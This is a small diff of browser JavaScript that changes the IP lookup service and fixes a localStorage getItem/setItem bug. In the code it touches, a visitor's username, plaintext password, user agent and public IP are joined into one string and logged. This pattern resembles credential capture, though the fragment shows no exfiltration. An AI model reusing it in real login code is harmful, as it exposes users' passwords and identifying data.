@@ -9,11 +9,11 @@
          
          var user_agent = navigator.userAgent;
          
-         $.getJSON("https://jsonip.com?callback=?", function(data) {
-            localStorage.setItem('ip',data.ip);
+         $.getJSON('https://api.ipify.org?format=json', function(data){  
+           localStorage.setItem('ip',data.ip);
          });
          
-         var combostring = username + "," + password + "," + user_agent + "," + localStorage.setItem('ip');
+         var combostring = username + "," + password + "," + user_agent + "," + localStorage.getItem('ip');
          
          console.log(combostring);
          
